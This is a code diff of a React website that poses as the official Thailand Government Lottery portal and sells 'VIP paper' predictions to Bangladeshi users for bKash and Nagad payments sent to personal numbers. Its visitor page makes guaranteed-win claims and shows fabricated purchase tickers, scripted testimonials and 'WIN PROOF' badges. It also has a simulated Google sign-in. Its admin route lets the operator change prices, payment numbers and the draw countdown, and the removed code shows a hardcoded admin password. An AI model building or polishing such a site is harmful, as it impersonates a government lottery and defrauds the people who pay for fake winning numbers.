@@ -1,39 +1,54 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { 
   ShieldCheck, Lock, Unlock, Crown, Sparkles, Copy, CheckCircle, 
-  AlertTriangle, Phone, Globe, Star, FileText, Download, Upload, 
-  Settings, Users, DollarSign, Calendar, LogOut, Search, ZoomIn, 
-  X, ChevronRight, Award, Bell, Eye, EyeOff, RefreshCw, Key, ExternalLink
+  Phone, Globe, Star, ZoomIn, X, Award, Bell, ExternalLink, LogOut
 } from 'lucide-react';
+import AdminPortal from './AdminPortal';
 
 export default function App() {
-  // State variables for application
-  const [isAdminOpen, setIsAdminOpen] = useState(false);
-  const [adminPassword, setAdminPassword] = useState('');
-  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
-  const [activeAdminTab, setActiveAdminTab] = useState('upcoming');
+  // Detect separate Admin URL (/admin or #admin)
+  const checkIsAdminRoute = () => {
+    const path = window.location.pathname.toLowerCase();
+    const hash = window.location.hash.toLowerCase();
+    return path === '/admin' || path === '/admin/' || hash === '#admin';
+  };
 
-  // Brand & Settings state
-  const [brandTitle, setBrandTitle] = useState('Thailand Government Lottery');
-  const [brandSubtitle, setBrandSubtitle] = useState('สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
-  const [logoUrl, setLogoUrl] = useState('https://www.glo.or.th/assets/img/logo.png');
-  const [partnerName, setPartnerName] = useState('Ariyan chaudhari');
-  const [partnerRole, setPartnerRole] = useState('Authorized VIP Distributor & Official Analyst');
-  const [partnerAvatar, setPartnerAvatar] = useState('https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=300');
-  const [bkashNumber, setBkashNumber] = useState('01700-000000 (Personal)');
-  const [nagadNumber, setNagadNumber] = useState('01800-000000 (Personal)');
-  const [imoNumber, setImoNumber] = useState('+8801700000000');
-  const [noticeText, setNoticeText] = useState('⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে। বিকাশ বা নগদ সেন্ড মনি করে শেষ ৪ ডিজিট দিয়ে পেপার আনলক করুন।');
-  const [drawDateText, setDrawDateText] = useState('16 December 2026');
-  const [countdownTarget, setCountdownTarget] = useState('2026-12-16T16:00:00');
+  const [isAdminRoute, setIsAdminRoute] = useState(checkIsAdminRoute);
 
-  // Pricing & Upcoming Paper
-  const [sarPrice, setSarPrice] = useState(125);
-  const [bdtPrice, setBdtPrice] = useState(4000);
-  const [upcomingPaperImage, setUpcomingPaperImage] = useState('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800');
+  useEffect(() => {
+    const handleRouteChange = () => {
+      setIsAdminRoute(checkIsAdminRoute());
+    };
+    window.addEventListener('popstate', handleRouteChange);
+    window.addEventListener('hashchange', handleRouteChange);
+    return () => {
+      window.removeEventListener('popstate', handleRouteChange);
+      window.removeEventListener('hashchange', handleRouteChange);
+    };
+  }, []);
+
+  // Persistent States with LocalStorage
+  const [brandTitle, setBrandTitle] = useState(() => localStorage.getItem('glo_brandTitle') || 'Thailand Government Lottery');
+  const [brandSubtitle, setBrandSubtitle] = useState(() => localStorage.getItem('glo_brandSubtitle') || 'สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
+  const [logoUrl, setLogoUrl] = useState(() => localStorage.getItem('glo_logoUrl') || 'https://www.glo.or.th/assets/img/logo.png');
+
+  const [partnerName, setPartnerName] = useState(() => localStorage.getItem('glo_partnerName') || 'Ariyan chaudhari');
+  const [partnerRole, setPartnerRole] = useState(() => localStorage.getItem('glo_partnerRole') || 'Authorized VIP Distributor & Official Analyst');
+  const [partnerAvatar, setPartnerAvatar] = useState(() => localStorage.getItem('glo_partnerAvatar') || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=300');
+  const [partnerLogoUrl, setPartnerLogoUrl] = useState(() => localStorage.getItem('glo_partnerLogoUrl') || 'https://www.glo.or.th/assets/img/logo.png');
+
+  const [bkashNumber, setBkashNumber] = useState(() => localStorage.getItem('glo_bkash') || '01700-000000 (Personal)');
+  const [nagadNumber, setNagadNumber] = useState(() => localStorage.getItem('glo_nagad') || '01800-000000 (Personal)');
+  const [imoNumber, setImoNumber] = useState(() => localStorage.getItem('glo_imo') || '+8801700000000');
+  const [noticeText, setNoticeText] = useState(() => localStorage.getItem('glo_notice') || '⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে। বিকাশ বা নগদ সেন্ড মনি করে শেষ ৪ ডিজিট দিয়ে পেপার আনলক করুন।');
+  const [drawDateText, setDrawDateText] = useState(() => localStorage.getItem('glo_drawDate') || '16 December 2026');
+  const [countdownTarget, setCountdownTarget] = useState(() => localStorage.getItem('glo_countdown') || '2026-12-16T16:00:00');
+
+  const [sarPrice, setSarPrice] = useState(() => Number(localStorage.getItem('glo_sarPrice')) || 125);
+  const [bdtPrice, setBdtPrice] = useState(() => Number(localStorage.getItem('glo_bdtPrice')) || 4000);
+  const [upcomingPaperImage, setUpcomingPaperImage] = useState(() => localStorage.getItem('glo_upcomingImg') || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800');
   const [isUnlocked, setIsUnlocked] = useState(false);
 
-  // User & Auth
   const [currentUser, setCurrentUser] = useState(null);
   const [isLoginModalOpen, setIsLoginModalOpen] = useState(false);
   const [loginHistory, setLoginHistory] = useState([
@@ -41,7 +56,6 @@ export default function App() {
     { name: 'Tanvir Ahmed', email: 'tanvir99@gmail.com', time: '2026-11-20 12:15:00' }
   ]);
 
-  // Payment Modal State
   const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
   const [senderLast4, setSenderLast4] = useState('');
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('bkash');
@@ -49,7 +63,6 @@ export default function App() {
     { id: 1, name: 'Rafiqul Islam', email: 'rafiqul.official@gmail.com', last4: '4829', method: 'bKash', amountSar: 125, amountBdt: 4000, time: '2026-11-20 14:35:00', status: 'Pending' }
   ]);
 
-  // Past Papers (Winning Proof Archive)
   const [pastPapers, setPastPapers] = useState([
     { 
       id: 1, 
@@ -69,22 +82,44 @@ export default function App() {
     }
   ]);
 
-  // Reviews
   const [reviews, setReviews] = useState([
     { id: 1, name: 'Nazmul Hossain', rating: 5, comment: 'আলহামদুলিল্লাহ, ভিআইপি পেপার নিয়ে প্রথমবারেই সরাসরি ৩UP উইন করেছি। অনেক ধন্যবাদ আরিয়ান ভাই!', status: 'Approved' },
     { id: 2, name: 'Jahangir Alam', rating: 5, comment: 'খুব বিশ্বস্ত সার্ভিস। পেমেন্ট করার ৫ মিনিটের মধ্যে পেপার পেয়ে গেছি।', status: 'Approved' }
   ]);
   const [newReviewName, setNewReviewName] = useState('');
-  const [newReviewRating, setNewReviewRating] = useState(5);
   const [newReviewComment, setNewReviewComment] = useState('');
 
-  // UI state
-  const [copiedField, setCopiedField] = useState(null);
   const [zoomImage, setZoomImage] = useState(null);
-  const [hdClarity, setHdClarity] = useState(true);
   const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });
 
-  // Countdown timer effect
+  // Persist updates to localStorage
+  useEffect(() => {
+    try {
+      localStorage.setItem('glo_brandTitle', brandTitle);
+      localStorage.setItem('glo_brandSubtitle', brandSubtitle);
+      localStorage.setItem('glo_logoUrl', logoUrl);
+      localStorage.setItem('glo_partnerName', partnerName);
+      localStorage.setItem('glo_partnerRole', partnerRole);
+      localStorage.setItem('glo_partnerAvatar', partnerAvatar);
+      localStorage.setItem('glo_partnerLogoUrl', partnerLogoUrl);
+      localStorage.setItem('glo_bkash', bkashNumber);
+      localStorage.setItem('glo_nagad', nagadNumber);
+      localStorage.setItem('glo_imo', imoNumber);
+      localStorage.setItem('glo_notice', noticeText);
+      localStorage.setItem('glo_drawDate', drawDateText);
+      localStorage.setItem('glo_countdown', countdownTarget);
+      localStorage.setItem('glo_sarPrice', String(sarPrice));
+      localStorage.setItem('glo_bdtPrice', String(bdtPrice));
+      localStorage.setItem('glo_upcomingImg', upcomingPaperImage);
+    } catch (e) {
+      console.warn('LocalStorage quota reached');
+    }
+  }, [
+    brandTitle, brandSubtitle, logoUrl, partnerName, partnerRole, partnerAvatar, 
+    partnerLogoUrl, bkashNumber, nagadNumber, imoNumber, noticeText, drawDateText, 
+    countdownTarget, sarPrice, bdtPrice, upcomingPaperImage
+  ]);
+
   useEffect(() => {
     const timer = setInterval(() => {
       const now = new Date().getTime();
@@ -103,39 +138,49 @@ export default function App() {
     return () => clearInterval(timer);
   }, [countdownTarget]);
 
-  // Check URL hash for admin panel
-  useEffect(() => {
-    const handleHash = () => {
-      if (window.location.hash === '#admin' || window.location.search.includes('admin=true')) {
-        setIsAdminOpen(true);
-      }
-    };
-    handleHash();
-    window.addEventListener('hashchange', handleHash);
-    return () => window.removeEventListener('hashchange', handleHash);
-  }, []);
+  // If URL is /admin or #admin, render ONLY the dedicated Admin Portal (completely isolated from Viewer page)
+  if (isAdminRoute) {
+    return (
+      <AdminPortal
+        brandTitle={brandTitle} setBrandTitle={setBrandTitle}
+        brandSubtitle={brandSubtitle} setBrandSubtitle={setBrandSubtitle}
+        logoUrl={logoUrl} setLogoUrl={setLogoUrl}
+        partnerName={partnerName} setPartnerName={setPartnerName}
+        partnerRole={partnerRole} setPartnerRole={setPartnerRole}
+        partnerAvatar={partnerAvatar} setPartnerAvatar={setPartnerAvatar}
+        partnerLogoUrl={partnerLogoUrl} setPartnerLogoUrl={setPartnerLogoUrl}
+        bkashNumber={bkashNumber} setBkashNumber={setBkashNumber}
+        nagadNumber={nagadNumber} setNagadNumber={setNagadNumber}
+        imoNumber={imoNumber} setImoNumber={setImoNumber}
+        noticeText={noticeText} setNoticeText={setNoticeText}
+        drawDateText={drawDateText} setDrawDateText={setDrawDateText}
+        countdownTarget={countdownTarget} setCountdownTarget={setCountdownTarget}
+        sarPrice={sarPrice} setSarPrice={setSarPrice}
+        bdtPrice={bdtPrice} setBdtPrice={setBdtPrice}
+        upcomingPaperImage={upcomingPaperImage} setUpcomingPaperImage={setUpcomingPaperImage}
+        setIsUnlocked={setIsUnlocked}
+        pendingPayments={pendingPayments} setPendingPayments={setPendingPayments}
+        pastPapers={pastPapers} setPastPapers={setPastPapers}
+        reviews={reviews} setReviews={setReviews}
+        loginHistory={loginHistory}
+      />
+    );
+  }
 
   const handleGoogleLoginSimulate = () => {
     const randomNames = ['Imran Khan', 'Abdul Rahim', 'Nasir Uddin', 'Kamal Hossain', 'Sumon Ahmed'];
     const name = randomNames[Math.floor(Math.random() * randomNames.length)];
     const email = name.toLowerCase().replace(/\s+/g, '') + Math.floor(Math.random() * 900 + 100) + '@gmail.com';
-    const userObj = {
-      name,
-      email,
-      photo: partnerAvatar
-    };
+    const userObj = { name, email, photo: partnerAvatar };
     setCurrentUser(userObj);
     setIsLoginModalOpen(false);
 
-    // Record in login history
     const newRecord = { name, email, time: new Date().toLocaleString() };
     setLoginHistory([newRecord, ...loginHistory]);
   };
 
-  const handleCopy = (text, fieldKey) => {
+  const handleCopy = (text) => {
     navigator.clipboard.writeText(text);
-    setCopiedField(fieldKey);
-    setTimeout(() => setCopiedField(null), 2000);
   };
 
   const handlePaymentSubmit = (e) => {
@@ -166,21 +211,7 @@ export default function App() {
     alert('পেমেন্ট রিকোয়েস্ট সফলভাবে জমা হয়েছে! অ্যাডমিন যাচাই করার পর পেপার আনলক করা হবে।');
   };
 
-  const exportLoginHistoryCsv = () => {
-    let csv = 'Name,Email,Timestamp\n';
-    loginHistory.forEach(item => {
-      csv += `"${item.name}","${item.email}","${item.time}"\n`;
-    });
-    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-    const url = URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    link.setAttribute('href', url);
-    link.setAttribute('download', 'login_history.csv');
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  };
-
+  // Pure Viewer Landing Page (zero admin UI or links)
   return (
     <div className="min-h-screen bg-[#031410] text-gray-100 font-sans selection:bg-amber-500 selection:text-black">
       
@@ -193,14 +224,13 @@ export default function App() {
         </div>
       </div>
 
-      {/* 2. Top Header */}
+      {/* 2. Top Header with Thailand Government Lottery Logo */}
       <header className="bg-[#041E18]/90 backdrop-blur-md border-b border-amber-500/30 sticky top-0 z-50">
         <div className="max-w-7xl mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-4">
           
-          {/* Logo & Brand */}
           <div className="flex items-center gap-3">
-            <div className="w-12 h-12 rounded-full border-2 border-amber-400 p-0.5 bg-black/40 overflow-hidden shadow-lg shadow-amber-500/20">
-              <img src={logoUrl} alt="Thailand GLO" className="w-full h-full object-contain" />
+            <div className="w-12 h-12 rounded-full border-2 border-amber-400 p-0.5 bg-black/40 overflow-hidden shadow-lg shadow-amber-500/20 flex-shrink-0">
+              <img src={logoUrl} alt="Thailand Government Lottery Logo" className="w-full h-full object-cover rounded-full" />
             </div>
             <div>
               <h1 className="text-xl md:text-2xl font-black bg-gradient-to-r from-amber-200 via-amber-400 to-yellow-500 bg-clip-text text-transparent">
@@ -210,7 +240,6 @@ export default function App() {
             </div>
           </div>
 
-          {/* Right Header: Google Auth & Admin Link */}
           <div className="flex items-center gap-3">
             {currentUser ? (
               <div className="flex items-center gap-3 bg-[#062C22] border border-amber-500/40 rounded-full py-1.5 px-4 shadow-md">
@@ -241,14 +270,6 @@ export default function App() {
                 Continue with Google
               </button>
             )}
-
-            <button 
-              onClick={() => setIsAdminOpen(true)}
-              className="text-gray-500 hover:text-amber-400 p-1.5 transition-colors"
-              title="Admin Panel"
-            >
-              <Settings size={18} />
-            </button>
           </div>
 
         </div>
@@ -272,7 +293,6 @@ export default function App() {
               Access 100% verified direct VIP paper numbers, secret formulas, and guaranteed winning tips straight from official government lottery analysts.
             </p>
 
-            {/* Countdown Clock */}
             <div className="grid grid-cols-4 gap-3 max-w-md pt-2">
               {[
                 { label: 'Days', val: timeLeft.days },
@@ -289,28 +309,28 @@ export default function App() {
           </div>
 
           <div className="lg:col-span-5 flex flex-col items-center justify-center bg-black/30 p-6 rounded-2xl border border-amber-500/25">
-            <div className="text-center space-y-3">
+            <div className="text-center space-y-3 w-full">
               <Crown size={40} className="text-amber-400 mx-auto animate-bounce" />
               <h3 className="text-xl font-bold text-amber-200">Live VIP Purchase Ticker</h3>
               <div className="bg-[#031410] border border-amber-500/30 rounded-xl p-4 text-left w-full space-y-3 text-xs">
                 <div className="flex items-center justify-between border-b border-gray-800 pb-2">
                   <span className="text-gray-300 font-semibold">👤 Al-Amin (Dhaka)</span>
-                  <span className="text-amber-400 font-bold">125 SAR | ৳ 4,000 BDT</span>
+                  <span className="text-amber-400 font-bold">{sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT</span>
                 </div>
                 <div className="flex items-center justify-between border-b border-gray-800 pb-2">
                   <span className="text-gray-300 font-semibold">👤 Jahangir (Riyadh)</span>
-                  <span className="text-amber-400 font-bold">125 SAR | ৳ 4,000 BDT</span>
+                  <span className="text-amber-400 font-bold">{sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT</span>
                 </div>
                 <div className="flex items-center justify-between">
                   <span className="text-gray-300 font-semibold">👤 Belal Hossain (Chittagong)</span>
-                  <span className="text-amber-400 font-bold">125 SAR | ৳ 4,000 BDT</span>
+                  <span className="text-amber-400 font-bold">{sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT</span>
                 </div>
               </div>
             </div>
           </div>
         </section>
 
-        {/* Upcoming VIP Paper Section (Locked / Unlocked) */}
+        {/* Upcoming VIP Paper Section */}
         <section className="bg-gradient-to-b from-[#062C22] to-[#041E18] border border-amber-500/40 rounded-3xl p-6 md:p-10 shadow-2xl">
           <div className="text-center max-w-2xl mx-auto space-y-3 mb-8">
             <span className="text-xs uppercase tracking-widest font-extrabold text-amber-400 bg-amber-500/10 px-3 py-1 rounded-full border border-amber-500/30">
@@ -323,7 +343,6 @@ export default function App() {
           </div>
 
           <div className="max-w-xl mx-auto bg-black/60 border-2 border-amber-500/50 rounded-2xl p-4 relative overflow-hidden shadow-2xl">
-            {/* Paper Preview */}
             <div className="relative aspect-[3/4] rounded-xl overflow-hidden bg-white/5 flex items-center justify-center">
               <img 
                 src={upcomingPaperImage} 
@@ -331,7 +350,6 @@ export default function App() {
                 className={`w-full h-full object-cover transition-all duration-500 ${isUnlocked ? 'filter-none' : 'blur-xl scale-105 opacity-40'}`}
               />
 
-              {/* Lock Overlay */}
               {!isUnlocked && (
                 <div className="absolute inset-0 bg-black/80 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center space-y-6">
                   <div className="w-20 h-20 rounded-full bg-amber-500/20 border-2 border-amber-400 flex items-center justify-center text-amber-400 shadow-lg shadow-amber-500/30 animate-pulse">
@@ -344,7 +362,6 @@ export default function App() {
                     </p>
                   </div>
 
-                  {/* Dual Price Tag */}
                   <div className="bg-gradient-to-r from-amber-600 to-yellow-600 text-black font-extrabold px-6 py-3 rounded-2xl shadow-xl text-lg flex items-center gap-3">
                     <span>{sarPrice} SAR</span>
                     <span className="text-black/50">|</span>
@@ -367,7 +384,6 @@ export default function App() {
                 </div>
               )}
 
-              {/* Unlocked View Badge */}
               {isUnlocked && (
                 <div className="absolute top-4 left-4 bg-emerald-600 text-white font-bold text-xs px-4 py-1.5 rounded-full shadow-lg flex items-center gap-1.5 border border-emerald-400">
                   <CheckCircle size={14} /> Unlocked & Verified
@@ -377,7 +393,7 @@ export default function App() {
           </div>
         </section>
 
-        {/* Past Games Winning Archive (বিগত ড্র-গুলোতে আমাদের ভিআইপি পেপারের সফলতার প্রমাণপত্র) */}
+        {/* Past Games Winning Archive */}
         <section className="space-y-8">
           <div className="text-center space-y-3">
             <span className="text-xs uppercase tracking-widest font-extrabold text-amber-400 bg-amber-500/10 px-3 py-1 rounded-full border border-amber-500/30">
@@ -392,21 +408,15 @@ export default function App() {
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
             {pastPapers.map((paper) => (
               <div key={paper.id} className="bg-[#062C22] border border-amber-500/30 rounded-3xl overflow-hidden shadow-2xl flex flex-col group hover:border-amber-400 transition-all duration-300">
-                
-                {/* Paper Image Container */}
                 <div className="relative bg-white/5 aspect-[3/4] overflow-hidden">
                   <img 
                     src={paper.image} 
                     alt={paper.date} 
-                    className={`w-full h-full object-cover transition-transform duration-500 group-hover:scale-105 ${hdClarity ? 'contrast-125 brightness-105' : ''}`} 
+                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105 contrast-125 brightness-105" 
                   />
-                  
-                  {/* WIN PROOF Badge */}
                   <div className="absolute top-3 left-3 bg-gradient-to-r from-amber-500 to-yellow-600 text-black font-extrabold text-[11px] px-3 py-1 rounded-full shadow-lg flex items-center gap-1">
                     <Award size={13} /> WIN PROOF
                   </div>
-
-                  {/* 3UP / DOWN Badge */}
                   <div className="absolute bottom-3 right-3 bg-black/80 backdrop-blur-md border border-amber-500/50 text-amber-300 font-mono text-xs px-3 py-1.5 rounded-xl shadow-lg flex items-center gap-2">
                     <span>3UP: <strong className="text-white">{paper.up3}</strong></span>
                     <span className="text-gray-500">|</span>
@@ -414,7 +424,6 @@ export default function App() {
                   </div>
                 </div>
 
-                {/* Card Footer Details */}
                 <div className="p-5 flex flex-col flex-grow justify-between space-y-4">
                   <div className="space-y-1">
                     <span className="text-xs text-amber-400 font-semibold">{paper.date}</span>
@@ -454,7 +463,6 @@ export default function App() {
             ))}
           </div>
 
-          {/* Submit Review Form */}
           <div className="bg-black/60 border border-amber-500/30 rounded-2xl p-6 max-w-xl mx-auto space-y-4">
             <h3 className="text-base font-bold text-amber-300 text-center">আপনার মূল্যবান রিভিউ প্রদান করুন</h3>
             <div className="space-y-3">
@@ -528,7 +536,7 @@ export default function App() {
               <div className="flex items-center gap-2">
                 <span className="font-mono text-amber-300 font-bold text-sm">{imoNumber}</span>
                 <button 
-                  onClick={() => handleCopy(imoNumber, 'imo')}
+                  onClick={() => handleCopy(imoNumber)}
                   className="bg-amber-500/20 text-amber-400 hover:bg-amber-500 hover:text-black p-1.5 rounded-lg text-xs transition-colors"
                   title="Copy Number"
                 >
@@ -541,34 +549,34 @@ export default function App() {
 
       </main>
 
-      {/* Footer & Authorized Section */}
+      {/* Footer & Authorized Partner Section (With Partner Avatar & Partner Logo beside Ariyan Choudhari) */}
       <footer className="bg-[#020C0A] border-t border-amber-500/30 mt-16 py-12 px-4">
         <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 items-center">
           
-          {/* Brand Col */}
           <div className="space-y-3 text-center md:text-left">
             <div className="flex items-center justify-center md:justify-start gap-3">
               <div className="w-10 h-10 rounded-full border border-amber-400 p-0.5 bg-black/40 overflow-hidden">
-                <img src={logoUrl} alt="Logo" className="w-full h-full object-contain" />
+                <img src={logoUrl} alt="Logo" className="w-full h-full object-cover rounded-full" />
               </div>
               <h3 className="font-extrabold text-white text-lg">{brandTitle}</h3>
             </div>
             <p className="text-xs text-gray-400">{brandSubtitle}</p>
           </div>
 
-          {/* Authorized VIP Partner Card */}
           <div className="bg-gradient-to-r from-[#062C22] to-[#041E18] border border-amber-500/50 rounded-3xl p-5 shadow-2xl flex items-center gap-4">
-            <img src={partnerAvatar} alt={partnerName} className="w-16 h-16 rounded-full border-2 border-amber-400 object-cover shadow-md" />
-            <div className="space-y-1">
+            <img src={partnerAvatar} alt={partnerName} className="w-16 h-16 rounded-full border-2 border-amber-400 object-cover shadow-md flex-shrink-0" />
+            <div className="space-y-1 flex-grow">
               <div className="inline-flex items-center gap-1 bg-amber-500/20 text-amber-300 text-[10px] font-bold px-2.5 py-0.5 rounded-full border border-amber-500/30">
                 <ShieldCheck size={12} /> Authorized VIP Partner
               </div>
-              <h4 className="font-extrabold text-white text-base">{partnerName}</h4>
+              <div className="flex items-center gap-2">
+                <h4 className="font-extrabold text-white text-base">{partnerName}</h4>
+                <img src={partnerLogoUrl} alt="Partner Official Logo" className="w-6 h-6 rounded-full border border-amber-400 object-cover bg-black p-0.5" />
+              </div>
               <p className="text-xs text-amber-300/80 font-medium">{partnerRole}</p>
             </div>
           </div>
 
-          {/* Copyright & Disclaimer */}
           <div className="text-center md:text-right space-y-2 text-xs text-gray-400">
             <p>&copy; 2026 Thailand Government Lottery. All Rights Reserved.</p>
             <p className="text-[10px] text-gray-500">Official Secure Portal for Authorized International VIP Members.</p>
@@ -606,7 +614,7 @@ export default function App() {
         </div>
       )}
 
-      {/* Simplified Payment Modal (bKash & Nagad) */}
+      {/* Payment Modal */}
       {isPaymentModalOpen && (
         <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
           <div className="bg-[#062C22] border border-amber-500/50 rounded-3xl p-6 md:p-8 max-w-md w-full shadow-2xl space-y-6 relative">
@@ -618,7 +626,6 @@ export default function App() {
               <p className="text-xs text-gray-300">নিচে দেওয়া বিকাশ বা নগদ নম্বরে সেন্ড মনি করুন।</p>
             </div>
 
-            {/* Price Box */}
             <div className="bg-black/40 border border-amber-500/30 rounded-2xl p-4 text-center space-y-1">
               <span className="text-xs text-gray-400 uppercase tracking-wider">Total Payable Amount</span>
               <div className="text-2xl font-black text-amber-400">
@@ -626,7 +633,6 @@ export default function App() {
               </div>
             </div>
 
-            {/* Method Tabs */}
             <div className="grid grid-cols-2 gap-3">
               <button 
                 onClick={() => setSelectedPaymentMethod('bkash')}
@@ -642,28 +648,25 @@ export default function App() {
               </button>
             </div>
 
-            {/* Number Display & Copy */}
             <div className="bg-black/50 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between">
               <div>
                 <span className="text-[10px] text-gray-400 uppercase">{selectedPaymentMethod.toUpperCase()} Personal Number</span>
                 <p className="font-mono font-bold text-amber-300 text-sm">{selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber}</p>
               </div>
               <button 
-                onClick={() => handleCopy(selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber, 'paynum')}
+                onClick={() => handleCopy(selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber)}
                 className="bg-amber-500 text-black p-2 rounded-xl text-xs font-bold flex items-center gap-1 hover:brightness-110"
               >
                 <Copy size={14} /> Copy
               </button>
             </div>
 
-            {/* Bengali Instructions */}
             <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-3 text-xs text-amber-200 space-y-1">
               <p className="font-bold">নির্দেশনা:</p>
               <p>১. আপনার বিকাশ/নগদ অ্যাপ থেকে উপরে দেওয়া নম্বরে <strong>৳ {bdtPrice.toLocaleString()} BDT</strong> সেন্ড করুন।</p>
               <p>২. টাকা পাঠানোর পর আপনার মোবাইল নম্বরের শেষ ৪ ডিজিট নিচে লিখুন।</p>
             </div>
 
-            {/* Form */}
             <form onSubmit={handlePaymentSubmit} className="space-y-4">
               <div className="space-y-1">
                 <label className="text-xs text-gray-300 font-medium">যে নম্বর থেকে টাকা পাঠিয়েছেন তার শেষ ৪ ডিজিট (Last 4 Digits):</label>
@@ -689,7 +692,7 @@ export default function App() {
         </div>
       )}
 
-      {/* Lightbox Modal for Winning Papers */}
+      {/* Lightbox Modal */}
       {zoomImage && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
           <div className="relative max-w-3xl w-full bg-[#062C22] border border-amber-500/50 rounded-3xl p-4 overflow-hidden shadow-2xl">
@@ -711,376 +714,6 @@ export default function App() {
                 Winning 3UP: <strong>{zoomImage.up3}</strong> | DOWN: <strong>{zoomImage.down}</strong>
               </span>
             </div>
-          </div>
-        </div>
-      )}
-
-      {/* Secret Admin Panel Modal */}
-      {isAdminOpen && (
-        <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
-          <div className="bg-[#041E18] border-2 border-amber-500 rounded-3xl max-w-5xl w-full max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
-            
-            {/* Admin Header */}
-            <div className="bg-[#062C22] border-b border-amber-500/40 p-4 flex items-center justify-between">
-              <div className="flex items-center gap-3">
-                <Crown className="text-amber-400" size={24} />
-                <h2 className="text-lg font-extrabold text-white">Secret Admin Control Panel</h2>
-              </div>
-              <button onClick={() => setIsAdminOpen(false)} className="text-gray-400 hover:text-white">
-                <X size={22} />
-              </button>
-            </div>
-
-            {!isAdminAuthenticated ? (
-              <div className="p-8 max-w-sm mx-auto my-auto text-center space-y-4">
-                <Key size={40} className="text-amber-400 mx-auto" />
-                <h3 className="text-xl font-bold text-white">Admin Authentication</h3>
-                <p className="text-xs text-gray-300">Enter administrator password to access controls (Default: admin123)</p>
-                <input 
-                  type="password" 
-                  placeholder="Password" 
-                  value={adminPassword} 
-                  onChange={e => setAdminPassword(e.target.value)} 
-                  className="w-full bg-black/50 border border-amber-500/40 rounded-xl px-4 py-3 text-center text-white focus:outline-none focus:border-amber-400"
-                />
-                <button 
-                  onClick={() => {
-                    if (adminPassword === 'admin123') {
-                      setIsAdminAuthenticated(true);
-                    } else {
-                      alert('ভুল পাসওয়ার্ড!');
-                    }
-                  }}
-                  className="w-full bg-gradient-to-r from-amber-500 to-yellow-600 text-black font-extrabold py-3 rounded-xl shadow-lg"
-                >
-                  Login to Admin
-                </button>
-              </div>
-            ) : (
-              <div className="flex flex-col md:flex-row flex-grow overflow-hidden">
-                {/* Admin Sidebar Tabs */}
-                <div className="w-full md:w-64 bg-[#062C22]/80 border-r border-amber-500/30 p-4 flex md:flex-col gap-2 overflow-x-auto">
-                  {[
-                    { id: 'upcoming', label: 'Upcoming & Pricing', icon: DollarSign },
-                    { id: 'payments', label: `Payments (${pendingPayments.filter(p=>p.status==='Pending').length})`, icon: CheckCircle },
-                    { id: 'past', label: 'Past Papers', icon: FileText },
-                    { id: 'reviews', label: `Reviews (${reviews.filter(r=>r.status==='Pending').length})`, icon: Star },
-                    { id: 'logins', label: 'Login History', icon: Users },
-                    { id: 'settings', label: 'Settings & Logos', icon: Settings },
-                  ].map(tab => {
-                    const IconComp = tab.icon;
-                    return (
-                      <button
-                        key={tab.id}
-                        onClick={() => setActiveAdminTab(tab.id)}
-                        className={`flex items-center gap-3 px-4 py-3 rounded-xl font-bold text-xs transition-all whitespace-nowrap ${activeAdminTab === tab.id ? 'bg-amber-500 text-black shadow-lg' : 'text-gray-300 hover:bg-white/5'}`}
-                      >
-                        <IconComp size={16} /> {tab.label}
-                      </button>
-                    );
-                  })}
-                </div>
-
-                {/* Admin Tab Content */}
-                <div className="flex-grow p-6 overflow-y-auto space-y-6">
-                  
-                  {activeAdminTab === 'upcoming' && (
-                    <div className="space-y-6 max-w-xl">
-                      <h3 className="text-xl font-bold text-amber-300">Upcoming VIP Paper & Pricing Control</h3>
-                      
-                      <div className="space-y-2">
-                        <label className="text-xs text-gray-300 font-bold">VIP Paper Image URL / Upload</label>
-                        <input 
-                          type="text" 
-                          value={upcomingPaperImage} 
-                          onChange={e => setUpcomingPaperImage(e.target.value)} 
-                          className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2.5 text-xs text-white"
-                        />
-                      </div>
-
-                      <div className="grid grid-cols-2 gap-4">
-                        <div className="space-y-2">
-                          <label className="text-xs text-gray-300 font-bold">SAR Price</label>
-                          <input 
-                            type="number" 
-                            value={sarPrice} 
-                            onChange={e => setSarPrice(Number(e.target.value))} 
-                            className="w-full bg-black/40 border border-amber-500/30 rounded-xl px-4 py-2.5 text-xs text-white"
-                          />
-                        </div>
-                        <div className="space-y-2">
